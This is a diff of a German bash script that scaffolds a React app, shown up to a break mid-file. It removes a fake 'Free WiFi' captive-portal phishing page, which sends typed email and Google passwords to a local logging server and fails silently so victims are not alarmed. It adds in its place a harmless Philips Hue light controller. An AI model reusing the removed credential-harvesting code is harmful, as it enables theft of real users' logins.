@@ -1,440 +1,733 @@
 #!/bin/bash
-# Script zum Erstellen einer React-App für einen Fake WiFi Hotspot
-# Für Unix/macOS/Linux mit Server-Komponente für Credential-Speicherung
-# Port 6666 wird für den Server verwendet
 
-set -e  # Stoppt das Skript bei Fehlern
+# Farben für Terminal-Ausgabe
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m' # No Color
 
-echo "🚀 Erstelle Free-WiFi Phishing-Testumgebung mit Datenbank-Backend..."
+echo -e "${GREEN}Philips Hue Controller - Installations-Skript${NC}"
+echo -e "=========================================="
 
-# Erstelle Projektordner
-mkdir -p free-wifi
-cd free-wifi
+# Überprüfen, ob Node.js installiert ist
+if ! command -v node &> /dev/null; then
+    echo -e "${YELLOW}Node.js ist nicht installiert. Bitte installiere Node.js.${NC}"
+    echo "https://nodejs.org/en/download/"
+    exit 1
+fi
 
-# Erstelle React-App mit create-react-app
-echo "📦 Erstelle React-App..."
-npx create-react-app .
+# Überprüfen, ob npm installiert ist
+if ! command -v npm &> /dev/null; then
+    echo -e "${YELLOW}npm ist nicht installiert. Bitte installiere npm.${NC}"
+    exit 1
+fi
 
-# Bereinige unnötige Dateien
-echo "🧹 Bereinige Standard-Dateien..."
-rm -f src/*.css src/*.svg src/App.test.js src/logo.svg src/reportWebVitals.js src/setupTests.js
-rm -f public/favicon.ico public/logo*.png public/manifest.json public/robots.txt
+# Projektordner erstellen
+echo -e "\n${GREEN}1. Erstelle Projektordner${NC}"
+PROJECT_NAME="philips-hue-controller"
 
-# Erstelle index.html
-echo "📄 Erstelle index.html..."
-cat > public/index.html << 'EOL'
-<!DOCTYPE html>
-<html lang="de">
-<head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="theme-color" content="#2C2E3B" />
-    <meta name="description" content="WiFi Hotspot Login" />
-    <title>WiFi - Anmeldung erforderlich</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
-</head>
-<body>
-    <noscript>Sie müssen JavaScript aktivieren, um diese Anwendung zu nutzen.</noscript>
-    <div id="root"></div>
-</body>
-</html>
-EOL
+if [ -d "$PROJECT_NAME" ]; then
+    echo -e "${YELLOW}Ordner '$PROJECT_NAME' existiert bereits. Möchtest du ihn überschreiben? (j/n)${NC}"
+    read -r OVERWRITE
+    if [ "$OVERWRITE" == "j" ] || [ "$OVERWRITE" == "J" ]; then
+        rm -rf "$PROJECT_NAME"
+    else
+        echo "Abbruch."
+        exit 1
+    fi
+fi
 
-# Erstelle App.js
-echo "📄 Erstelle App.js..."
-cat > src/App.js << 'EOL'
-import React, { useState } from 'react';
+# React-App erstellen
+echo -e "\n${GREEN}2. Erstelle React-App${NC}"
+echo -e "Dies kann einige Minuten dauern..."
+npx create-react-app "$PROJECT_NAME"
+
+# In Projektordner wechseln
+cd "$PROJECT_NAME" || exit
+
+# Erstelle Verzeichnisstruktur
+echo -e "\n${GREEN}3. Erstelle Verzeichnisstruktur${NC}"
+mkdir -p src/components
+
+# Lösche nicht benötigte Dateien
+echo -e "\n${GREEN}4. Lösche nicht benötigte Dateien${NC}"
+rm -f src/App.css src/App.js src/App.test.js src/logo.svg src/reportWebVitals.js src/setupTests.js
+
+# Erstelle App.jsx
+echo -e "\n${GREEN}5. Erstelle Hauptkomponente (App.jsx)${NC}"
+cat > src/App.jsx << 'EOF'
+import React, { useState, useEffect } from 'react';
 import './App.css';
+import LightCard from './components/LightCard';
 
 function App() {
-  const [showLoginForm, setShowLoginForm] = useState(false);
-  const [showGoogleForm, setShowGoogleForm] = useState(false);
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-  const [googleEmail, setGoogleEmail] = useState('');
-  const [googlePassword, setGooglePassword] = useState('');
-  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [bridgeIP, setBridgeIP] = useState('');
+  const [username, setUsername] = useState('');
+  const [connectedToBridge, setConnectedToBridge] = useState(false);
+  const [lights, setLights] = useState({});
+  const [loading, setLoading] = useState(false);
+  const [statusMessage, setStatusMessage] = useState({ message: '', type: 'info' });
 
-  const handleStandardLogin = () => {
-    setShowLoginForm(true);
-    setShowGoogleForm(false);
+  // Gespeicherte Werte laden
+  useEffect(() => {
+    const savedBridgeIP = localStorage.getItem('hue-bridge-ip');
+    const savedUsername = localStorage.getItem('hue-username');
+
+    if (savedBridgeIP) {
+      setBridgeIP(savedBridgeIP);
+    }
+
+    if (savedUsername) {
+      setUsername(savedUsername);
+    }
+
+    if (savedBridgeIP && savedUsername) {
+      connectToBridge(savedBridgeIP, savedUsername);
+    }
+  }, []);
+
+  // Status setzen
+  const setStatus = (message, type = 'info') => {
+    setStatusMessage({ message, type });
   };
 
-  const handleGoogleLogin = () => {
-    setShowGoogleForm(true);
-    setShowLoginForm(false);
-  };
+  // Bridge finden
+  const discoverBridge = async () => {
+    setLoading(true);
+    setStatus('Suche nach Hue Bridge im Netzwerk...', 'info');
 
-  const sendData = async (data) => {
     try {
-      // Verwende Port 6666 für Server-Endpunkt
-      const url = 'http://localhost:6666/api/log';
+      const response = await fetch('https://discovery.meethue.com/');
+      const bridges = await response.json();
 
-      await fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(data),
-      });
-
-      // Optional: Hier kann die Verarbeitung der Antwort erfolgen
+      if (bridges && bridges.length > 0) {
+        setBridgeIP(bridges[0].internalipaddress);
+        setStatus(`Bridge gefunden: ${bridges[0].internalipaddress}`, 'success');
+      } else {
+        setStatus('Keine Bridge gefunden. Versuche die IP manuell einzugeben.', 'error');
+      }
     } catch (error) {
-      console.error('Error:', error);
-      // Fehler leise behandeln, um den Benutzer nicht zu alarmieren
+      setStatus('Fehler bei der Bridge-Suche: ' + error.message, 'error');
+    }
+
+    setLoading(false);
+  };
+
+  // Mit Bridge verbinden
+  const connectToBridge = async (ip = bridgeIP, user = username) => {
+    if (!ip) {
+      setStatus('Bitte Bridge IP eingeben', 'error');
+      return;
+    }
+
+    if (!user) {
+      setStatus('Bitte API Username eingeben', 'error');
+      return;
+    }
+
+    setLoading(true);
+    setStatus('Verbinde mit Hue Bridge...', 'info');
+
+    try {
+      const response = await fetch(`http://${ip}/api/${user}/lights`);
+      const data = await response.json();
+
+      if (data.error && data.error[0].description.includes('unauthorized')) {
+        setStatus('Unauthorisiert. Bitte erstelle einen neuen Benutzer.', 'error');
+        setLoading(false);
+        return;
+      }
+
+      setConnectedToBridge(true);
+      setLights(data);
+
+      // Einstellungen speichern
+      localStorage.setItem('hue-bridge-ip', ip);
+      localStorage.setItem('hue-username', user);
+
+      setStatus('Erfolgreich mit Hue Bridge verbunden', 'success');
+    } catch (error) {
+      setStatus('Verbindungsfehler: ' + error.message, 'error');
+    }
+
+    setLoading(false);
+  };
+
+  // Neuen Benutzer erstellen
+  const createUser = async () => {
+    if (!bridgeIP) {
+      setStatus('Bitte Bridge IP eingeben', 'error');
+      return;
+    }
+
+    setLoading(true);
+    setStatus('Drücke den Link-Button auf deiner Hue Bridge und klicke dann hier', 'info');
+
+    try {
+      const response = await fetch(`http://${bridgeIP}/api`, {
+        method: 'POST',
+        body: JSON.stringify({
+          devicetype: 'hue_react_controller'
+        })
+      });
+      const data = await response.json();
+
+      if (data[0].error && data[0].error.type === 101) {
+        setStatus('Drücke zuerst den Link-Button auf der Bridge', 'error');
+      } else if (data[0].success) {
+        const newUsername = data[0].success.username;
+        setUsername(newUsername);
+        localStorage.setItem('hue-username', newUsername);
+        setStatus('Benutzer erfolgreich erstellt', 'success');
+      }
+    } catch (error) {
+      setStatus('Fehler beim Erstellen des Benutzers: ' + error.message, 'error');
+    }
+
+    setLoading(false);
+  };
+
+  // Licht ein-/ausschalten
+  const toggleLight = async (id, on) => {
+    try {
+      const response = await fetch(`http://${bridgeIP}/api/${username}/lights/${id}/state`, {
+        method: 'PUT',
+        body: JSON.stringify({ on })
+      });
+      const data = await response.json();
+
+      if (data[0].success) {
+        setLights(prevLights => ({
+          ...prevLights,
+          [id]: {
+            ...prevLights[id],
+            state: {
+              ...prevLights[id].state,
+              on
+            }
+          }
+        }));
+      }
+    } catch (error) {
+      setStatus(`Fehler beim Schalten von Licht ${id}: ${error.message}`, 'error');
     }
   };
 
-  const handleLoginSubmit = async (e) => {
-    e.preventDefault();
-    setIsSubmitting(true);
+  // Helligkeit setzen
+  const setBrightness = async (id, brightness) => {
+    try {
+      const response = await fetch(`http://${bridgeIP}/api/${username}/lights/${id}/state`, {
+        method: 'PUT',
+        body: JSON.stringify({ bri: parseInt(brightness) })
+      });
+      const data = await response.json();
 
-    await sendData({
-      type: 'email',
-      email,
-      password
-    });
-
-    // Weiterleitung nach kurzer Verzögerung
-    setTimeout(() => {
-      window.location.href = "https://www.google.com";
-    }, 1000);
+      if (data[0].success) {
+        setLights(prevLights => ({
+          ...prevLights,
+          [id]: {
+            ...prevLights[id],
+            state: {
+              ...prevLights[id].state,
+              bri: parseInt(brightness)
+            }
+          }
+        }));
+      }
+    } catch (error) {
+      setStatus(`Fehler beim Einstellen der Helligkeit von Licht ${id}: ${error.message}`, 'error');
+    }
   };
 
-  const handleGoogleSubmit = async (e) => {
-    e.preventDefault();
-    setIsSubmitting(true);
+  // Farbe setzen
+  const setColor = async (id, hexColor) => {
+    const hsv = hexToHsv(hexColor);
 
-    await sendData({
-      type: 'google',
-      email: googleEmail,
-      password: googlePassword
-    });
+    try {
+      const response = await fetch(`http://${bridgeIP}/api/${username}/lights/${id}/state`, {
+        method: 'PUT',
+        body: JSON.stringify({
+          hue: hsv.hue,
+          sat: hsv.sat
+        })
+      });
+      const data = await response.json();
 
-    // Weiterleitung nach kurzer Verzögerung
-    setTimeout(() => {
-      window.location.href = "https://www.google.com";
-    }, 1000);
+      if (data[0].success) {
+        setLights(prevLights => ({
+          ...prevLights,
+          [id]: {
+            ...prevLights[id],
+            state: {
+              ...prevLights[id].state,
+              hue: hsv.hue,
+              sat: hsv.sat
+            }
+          }
+        }));
+      }
+    } catch (error) {
+      setStatus(`Fehler beim Einstellen der Farbe von Licht ${id}: ${error.message}`, 'error');
+    }
+  };
+
+  // Konvertierung: Hex zu HSV für die Hue API
+  const hexToHsv = (hex) => {
+    // Hex zu RGB
+    hex = hex.replace('#', '');
+    const r = parseInt(hex.substring(0, 2), 16) / 255;
+    const g = parseInt(hex.substring(2, 4), 16) / 255;
+    const b = parseInt(hex.substring(4, 6), 16) / 255;
+
+    const max = Math.max(r, g, b);
+    const min = Math.min(r, g, b);
+    const diff = max - min;
+
+    let h = 0;
+
+    if (diff === 0) {
+      h = 0;
+    } else if (max === r) {
+      h = ((g - b) / diff) % 6;
+    } else if (max === g) {
+      h = (b - r) / diff + 2;
+    } else {
+      h = (r - g) / diff + 4;
+    }
+
+    h = Math.round(h * 60);
+    if (h < 0) h += 360;
+
+    // Für Hue API: hue von 0-65535
+    const hueForApi = Math.round((h / 360) * 65535);
+
+    // Sättigung von 0-254
+    const s = (max === 0) ? 0 : diff / max;
+    const satForApi = Math.round(s * 254);
+
+    return {
+      hue: hueForApi,
+      sat: satForApi
+    };
   };
 
   return (
-    <div className="container">
-      <div className="status-bar">
-        <div className="wifi-name">Free_WiFi_Hotspot</div>
-        <div className="signal-strength">
-          <div className="signal-bar"></div>
-          <div className="signal-bar"></div>
-          <div className="signal-bar"></div>
-          <div className="signal-bar inactive"></div>
-          <div className="signal-bar inactive"></div>
+    <div className="app">
+      <header>
+        <h1>Philips Hue Controller</h1>
+      </header>
+
+      <div className="container">
+        <div className="setup-section">
+          <h2>Verbindung einrichten</h2>
+          <div>
+            <label htmlFor="bridge-ip">Bridge IP:</label>
+            <input
+              type="text"
+              id="bridge-ip"
+              placeholder="z.B. 192.168.1.2"
+              value={bridgeIP}
+              onChange={(e) => setBridgeIP(e.target.value)}
+            />
+          </div>
+          <div>
+            <label htmlFor="username">API Username:</label>
+            <input
+              type="text"
+              id="username"
+              placeholder="API Username"
+              value={username}
+              onChange={(e) => setUsername(e.target.value)}
+            />
+          </div>
+          <div>
+            <button onClick={() => connectToBridge()}>Verbinden</button>
+            <button onClick={discoverBridge}>Bridge finden</button>
+            <button onClick={createUser}>Neuen Benutzer erstellen</button>
+          </div>
+          {statusMessage.message && (
+            <div className={`status-message status-${statusMessage.type}`}>
+              {statusMessage.message}
+            </div>
+          )}
         </div>
-      </div>
 
-      <div className="header">
-        <div className="wifi-icon">
-          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M12 6C8.62 6 5.5 7.12 3 9.09L12 21L21 9.09C18.5 7.12 15.38 6 12 6Z" fill="#2C2E3B" fillOpacity="0.7"/>
-            <path d="M12 3C7.95 3 4.21 4.34 1.2 6.6L3 9.09C5.5 7.12 8.62 6 12 6C15.38 6 18.5 7.12 21 9.09L22.8 6.6C19.79 4.34 16.05 3 12 3Z" fill="#2C2E3B" fillOpacity="0.4"/>
-          </svg>
-        </div>
-        <h1>WLAN-Anmeldung erforderlich</h1>
-        <p>Melde dich an, um auf das Internet zuzugreifen.</p>
-      </div>
-
-      {!showLoginForm && !showGoogleForm && (
-        <>
-          <button onClick={handleGoogleLogin} className="google-btn">
-            <svg className="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
-              <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-              <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-              <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-              <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-              <path fill="none" d="M0 0h48v48H0z"/>
-            </svg>
-            <span className="google-text">Mit Google anmelden</span>
-          </button>
-
-          <div className="divider">
-            <div className="divider-line"></div>
-            <div className="divider-text">ODER</div>
-            <div className="divider-line"></div>
+        {loading && (
+          <div className="loading">
+            <p>Lade Daten...</p>
           </div>
+        )}
 
-          <button onClick={handleStandardLogin} className="submit-btn">Mit E-Mail anmelden</button>
-        </>
-      )}
-
-      {showLoginForm && (
-        <form onSubmit={handleLoginSubmit} className="form">
-          <div className="form-group">
-            <label htmlFor="email">E-Mail</label>
-            <input
-              type="email"
-              id="email"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              required
-            />
+        {connectedToBridge && !loading && (
+          <div className="lights-section">
+            <h2>Verfügbare Lampen</h2>
+            <div className="lights-container">
+              {Object.keys(lights).map(id => (
+                <LightCard
+                  key={id}
+                  id={id}
+                  light={lights[id]}
+                  toggleLight={toggleLight}
+                  setBrightness={setBrightness}
+                  setColor={setColor}
+                />
+              ))}
+            </div>
           </div>
-          <div className="form-group">
-            <label htmlFor="password">Passwort</label>
-            <input
-              type="password"
-              id="password"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              required
-            />
-          </div>
-          <button type="submit" className="submit-btn" disabled={isSubmitting}>
-            {isSubmitting ? 'Wird angemeldet...' : 'Anmelden'}
-          </button>
-        </form>
-      )}
-
-      {showGoogleForm && (
-        <form onSubmit={handleGoogleSubmit} className="form">
-          <div className="form-group">
-            <label htmlFor="google-email">Google-E-Mail</label>
-            <input
-              type="email"
-              id="google-email"
-              value={googleEmail}
-              onChange={(e) => setGoogleEmail(e.target.value)}
-              required
-            />
-          </div>
-          <div className="form-group">
-            <label htmlFor="google-password">Google-Passwort</label>
-            <input
-              type="password"
-              id="google-password"
-              value={googlePassword}
-              onChange={(e) => setGooglePassword(e.target.value)}
-              required
-            />
-          </div>
-          <button type="submit" className="submit-btn" disabled={isSubmitting}>
-            {isSubmitting ? 'Wird angemeldet...' : 'Mit Google anmelden'}
-          </button>
-        </form>
-      )}
-
-      <div className="footer">
-        <p>Durch die Anmeldung akzeptierst du die <a href="#">Nutzungsbedingungen</a> und <a href="#">Datenschutzrichtlinien</a>.</p>
+        )}
       </div>
     </div>
   );
 }
 
 export default App;
-EOL
+EOF
+
+# Erstelle LightCard.jsx
+echo -e "\n${GREEN}6. Erstelle LightCard-Komponente${NC}"
+cat > src/components/LightCard.jsx << 'EOF'
+import React from 'react';
+
+const LightCard = ({ id, light, toggleLight, setBrightness, setColor }) => {
+  // Farbe aus Licht-Status ermitteln
+  const getColorFromState = (state) => {
+    if (state.hue === undefined || state.sat === undefined) {
+      // Für weiße Lampen
+      const bri = state.bri || 254;
+      const briPercentage = (bri / 254) * 100;
+      return `hsl(0, 0%, ${briPercentage}%)`;
+    }
+
+    // Für Farblampen
+    const hue = (state.hue / 65535) * 360;
+    const sat = (state.sat / 254) * 100;
+    const bri = (state.bri || 254) / 254 * 100;
+
+    return `hsl(${hue}, ${sat}%, ${bri}%)`;
+  };
+
+  // Hex-Farbe aus Licht-Status ermitteln
+  const getHexColor = (state) => {
+    if (state.hue === undefined || state.sat === undefined) {
+      return '#ffffff';
+    }
+
+    return hsvToHex(state.hue, state.sat, state.bri || 254);
+  };
+
+  // Konvertierung: HSV zu Hex
+  const hsvToHex = (h, s, v) => {
+    // Konvertieren der Hue-API-Werte zu Standard-HSV
+    h = (h / 65535) * 360;
+    s = s / 254;
+    v = v / 254;
+
+    const c = v * s;
+    const x = c * (1 - Math.abs(((h / 60) % 2) - 1));
+    const m = v - c;
+
+    let r, g, b;
+
+    if (h >= 0 && h < 60) {
+      [r, g, b] = [c, x, 0];
+    } else if (h >= 60 && h < 120) {
+      [r, g, b] = [x, c, 0];
+    } else if (h >= 120 && h < 180) {
+      [r, g, b] = [0, c, x];
+    } else if (h >= 180 && h < 240) {
+      [r, g, b] = [0, x, c];
+    } else if (h >= 240 && h < 300) {
+      [r, g, b] = [x, 0, c];
+    } else {
+      [r, g, b] = [c, 0, x];
+    }
+
+    r = Math.round((r + m) * 255).toString(16).padStart(2, '0');
+    g = Math.round((g + m) * 255).toString(16).padStart(2, '0');
+    b = Math.round((b + m) * 255).toString(16).padStart(2, '0');
+
+    return `#${r}${g}${b}`;
+  };
+
+  return (
+    <div className="light-card" data-light-id={id}>
+      <div className="light-header">
+        <div
+          className="color-indicator"
+          style={{
+            backgroundColor: light.state.on
+              ? getColorFromState(light.state)
+              : '#333'
+          }}
+        />
+        <h3>{light.name}</h3>
+      </div>
+
+      <label className="switch">
+        <input
+          type="checkbox"
+          checked={light.state.on}
+          onChange={(e) => toggleLight(id, e.target.checked)}
+        />
+        <span className="slider"></span>
+      </label>
+
+      <div className="light-controls">
+        <div>
+          <label>Helligkeit:</label>
+          <input
+            type="range"
+            min="1"
+            max="254"
+            value={light.state.bri || 254}
+            onChange={(e) => setBrightness(id, e.target.value)}
+          />
+        </div>
+
+        {light.state.hue !== undefined && light.state.sat !== undefined && (
+          <div>
+            <label>Farbe:</label>
+            <input
+              type="color"
+              className="color-picker"
+              value={getHexColor(light.state)}
+              onChange={(e) => setColor(id, e.target.value)}
+            />
+          </div>
+        )}
+      </div>
+    </div>
+  );
+};
+
+export default LightCard;
+EOF
 
 # Erstelle App.css
-echo "📄 Erstelle App.css..."
-cat > src/App.css << 'EOL'
+echo -e "\n${GREEN}7. Erstelle CSS-Datei${NC}"
+cat > src/App.css << 'EOF'
+/* App.css */
+:root {
+  --primary-color: #2C2E3B;
+  --text-color: #ffffff;
+  --accent-color: #5072A7;
+  --background-color: #1A1B23;
+  --card-color: #33364A;
+}
+
 * {
+  box-sizing: border-box;
   margin: 0;
   padding: 0;
-  box-sizing: border-box;
-  font-family: 'Roboto', Arial, sans-serif;
 }
 
 body {
-  background-color: #f1f1f1;
-  display: flex;
-  justify-content: center;
-  align-items: center;
+  font-family: 'Segoe UI', 'Roboto', sans-serif;
+  background-color: var(--background-color);
+  color: var(--text-color);
+}
+
+.app {
   min-height: 100vh;
-  color: #5f6368;
+  display: flex;
+  flex-direction: column;
+}
+
+header {
+  background-color: var(--primary-color);
+  padding: 1rem;
+  text-align: center;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.2);
 }
 
 .container {
-  background-color: #fff;
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 1rem;
+  flex: 1;
+}
+
+.setup-section {
+  background-color: var(--card-color);
+  padding: 1.5rem;
   border-radius: 8px;
-  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+  margin-bottom: 1.5rem;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+
+.setup-section div {
+  margin-bottom: 1rem;
+}
+
+.setup-section label {
+  display: block;
+  margin-bottom: 0.5rem;
+}
+
+.setup-section input {
   width: 100%;
-  max-width: 450px;
-  padding: 40px 30px;
-  margin: 20px auto;
+  padding: 0.5rem;
+  border-radius: 4px;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  background-color: rgba(0, 0, 0, 0.2);
+  color: var(--text-color);
 }
 
-.header {
-  text-align: center;
-  margin-bottom: 30px;
+.setup-section button {
+  margin-right: 0.5rem;
+  margin-bottom: 0.5rem;
 }
 
-.wifi-icon {
-  font-size: 36px;
-  color: #2C2E3B;
-  margin-bottom: 15px;
+.lights-container {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 1.5rem;
 }
 
-h1 {
-  font-size: 22px;
-  color: #202124;
-  margin-bottom: 10px;
-  font-weight: normal;
+.light-card {
+  background-color: var(--card-color);
+  border-radius: 8px;
+  padding: 1.5rem;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+  transition: all 0.3s ease;
 }
 
-p {
-  font-size: 14px;
-  margin-bottom: 20px;
-  line-height: 1.5;
+.light-card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 5px 15px rgba(0,0,0,0.2);
 }
 
-.google-btn {
+.light-header {
   display: flex;
   align-items: center;
-  justify-content: center;
-  background-color: #fff;
-  border: 1px solid #dadce0;
-  border-radius: 4px;
-  padding: 10px 15px;
-  width: 100%;
-  margin-bottom: 20px;
-  cursor: pointer;
-  transition: background-color 0.3s;
+  margin-bottom: 0.5rem;
 }
 
-.google-btn:hover {
-  background-color: #f7f7f7;
-}
-
-.google-icon {
+.color-indicator {
+  width: 30px;
+  height: 30px;
+  border-radius: 50%;
   margin-right: 10px;
-  width: 18px;
-  height: 18px;
 }
 
-.google-text {
-  font-size: 14px;
-  color: #5f6368;
+.light-controls {
+  margin-top: 1rem;
 }
 
-.form-group {
-  margin-bottom: 15px;
+.light-controls div {
+  margin-bottom: 1rem;
 }
 
-label {
+.light-controls label {
   display: block;
-  font-size: 12px;
-  margin-bottom: 5px;
-  color: #5f6368;
+  margin-bottom: 0.5rem;
 }
 
-input {
-  width: 100%;
-  padding: 12px 10px;
-  border: 1px solid #dadce0;
-  border-radius: 4px;
-  font-size: 14px;
-  color: #202124;
-}
-
-input:focus {
-  outline: none;
-  border-color: #2C2E3B;
-}
-
-.submit-btn {
-  width: 100%;
-  padding: 12px;
-  background-color: #2C2E3B;
+button {
+  background-color: var(--accent-color);
   color: white;
   border: none;
+  padding: 0.5rem 1rem;
   border-radius: 4px;
-  font-size: 14px;
   cursor: pointer;
+  font-weight: 500;
   transition: background-color 0.3s;
-  margin-top: 20px;
 }
 
-.submit-btn:hover {
-  background-color: #1e2030;
+button:hover {
+  background-color: #3c5a8f;
 }
 
-.submit-btn:disabled {
-  background-color: #9aa0a6;
-  cursor: not-allowed;
-}
-
-.divider {
-  display: flex;
-  align-items: center;
-  margin: 20px 0;
-}
-
-.divider-line {
-  flex-grow: 1;
-  height: 1px;
-  background-color: #dadce0;
-}
-
-.divider-text {
-  padding: 0 15px;
-  color: #5f6368;
-  font-size: 12px;
-}
-
-.footer {
-  text-align: center;
-  margin-top: 30px;
-  font-size: 12px;
-  color: #5f6368;
-}
-
-.footer a {
-  color: #2C2E3B;
-  text-decoration: none;
-}
-
-.status-bar {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 10px 15px;
-  background-color: #f9f9f9;
-  font-size: 12px;
-  color: #5f6368;
-  border-radius: 4px;
-  margin-bottom: 20px;
-}
-
-.wifi-name {
-  font-weight: bold;
-}
-
-.signal-strength {
-  display: flex;
-  align-items: center;
-}
-
-.signal-bar {
-  height: 8px;
-  width: 3px;
-  background-color: #2C2E3B;
-  margin-right: 2px;
-  border-radius: 1px;
-}
-
-.inactive {
-  background-color: #dadce0;
-}
-
-.form {
+input[type="range"] {
   width: 100%;
+  margin: 0.5rem 0;
 }
-EOL
+
+.color-picker {
+  width: 100%;
+  height: 40px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+.switch {
+  position: relative;
+  display: inline-block;
+  width: 60px;
+  height: 34px;
+}
+
+.switch input {
+  opacity: 0;
+  width: 0;
+  height: 0;
+}
+
+.slider {
+  position: absolute;
+  cursor: pointer;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: #ccc;
+  transition: .4s;
+  border-radius: 34px;
+}
+
+.slider:before {
+  position: absolute;
+  content: "";
+  height: 26px;
+  width: 26px;
+  left: 4px;
+  bottom: 4px;
+  background-color: white;
+  transition: .4s;
+  border-radius: 50%;
+}
+
+input:checked + .slider {
+  background-color: var(--accent-color);
+}
+
+input:checked + .slider:before {
+  transform: translateX(26px);
+}
+
+.loading {
+  text-align: center;
+  padding: 2rem;
+}
+
+.status-message {
+  padding: 1rem;
+  margin: 1rem 0;
+  border-radius: 4px;
+}
+
+.status-error {
+  background-color: rgba(255, 99, 71, 0.2);
+  color: tomato;
+}
+
+.status-success {
+  background-color: rgba(144, 238, 144, 0.2);
+  color: lightgreen;
+}
+
+.status-info {
+  background-color: rgba(100, 149, 237, 0.2);
+  color: cornflowerblue;
+}
+EOF
 
 # Erstelle index.js
-echo "📄 Erstelle index.js..."
-cat > src/index.js << 'EOL'
+echo -e "\n${GREEN}8. Aktualisiere index.js${NC}"
+cat > src/index.js << 'EOF'
 import React from 'react';
 import ReactDOM from 'react-dom/client';
-import './index.css';
+import './App.css';
 import App from './App';
 
 const root = ReactDOM.createRoot(document.getElementById('root'));
@@ -443,567 +736,270 @@ root.render(
     <App />
   </React.StrictMode>
 );
-EOL
+EOF
 
-# Erstelle index.css
-echo "📄 Erstelle index.css..."
-cat > src/index.css << 'EOL'
-body {
-  margin: 0;
-  font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Oxygen',
-    'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue',
-    sans-serif;
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
-  background-color: #f1f1f1;
-}
-
-code {
-  font-family: source-code-pro, Menlo, Monaco, Consolas, 'Courier New',
-    monospace;
-}
-EOL
-
-# Erstelle package.json
-echo "📄 Aktualisiere package.json..."
-cat > package.json << 'EOL'
-{
-  "name": "free-wifi",
-  "version": "0.1.0",
-  "private": true,
-  "dependencies": {
-    "@testing-library/jest-dom": "^5.16.5",
-    "@testing-library/react": "^13.4.0",
-    "@testing-library/user-event": "^13.5.0",
-    "body-parser": "^1.20.2",
-    "cors": "^2.8.5",
-    "express": "^4.18.2",
-    "react": "^18.2.0",
-    "react-dom": "^18.2.0",
-    "react-scripts": "5.0.1",
-    "sqlite3": "^5.1.7",
-    "web-vitals": "^2.1.4"
-  },
-  "scripts": {
-    "start": "react-scripts start",
-    "build": "react-scripts build",
-    "test": "react-scripts test",
-    "eject": "react-scripts eject",
-    "deploy": "npm run build && echo 'Build abgeschlossen. Die Dateien befinden sich im Ordner \"build\"'",
-    "server": "node server.js",
-    "start-all": "npm run build && npm run server"
-  },
-  "eslintConfig": {
-    "extends": [
-      "react-app",
-      "react-app/jest"
-    ]
-  },
-  "browserslist": {
-    "production": [
-      ">0.2%",
-      "not dead",
-      "not op_mini all"
-    ],
-    "development": [
-      "last 1 chrome version",
-      "last 1 firefox version",
-      "last 1 safari version"
-    ]
-  },
-  "proxy": "http://localhost:6666"
-}
-EOL
-
-# Erstelle ein Skript zum Generieren des QR-Codes
-echo "📄 Erstelle QR-Code Generator Skript..."
-cat > generate-qr.js << 'EOL'
-const fs = require('fs');
-const qrcode = require('qrcode');
-
-// Die URL, für die ein QR-Code generiert werden soll
-const url = process.argv[2] || 'http://localhost:3000';
-
-// Generiere QR-Code
-qrcode.toFile(
-  'wifi-qr.png',
-  url,
-  {
-    color: {
-      dark: '#2C2E3B',
-      light: '#FFFFFF'
-    },
-    width: 300,
-    margin: 1
-  },
-  function(err) {
-    if (err) {
-      console.error('Fehler beim Erstellen des QR-Codes:', err);
-      return;
-    }
-    console.log('✅ QR-Code wurde erstellt: wifi-qr.png');
-    console.log(`Der QR-Code führt zu: ${url}`);
-  }
-);
-EOL
-
-# Erstelle Admin-Dashboard
-echo "📄 Erstelle Admin-Dashboard..."
-mkdir -p public/admin
-cat > public/admin/index.html << 'EOL'
+# Aktualisiere public/index.html
+echo -e "\n${GREEN}9. Aktualisiere index.html${NC}"
+cat > public/index.html << 'EOF'
 <!DOCTYPE html>
 <html lang="de">
-<head>
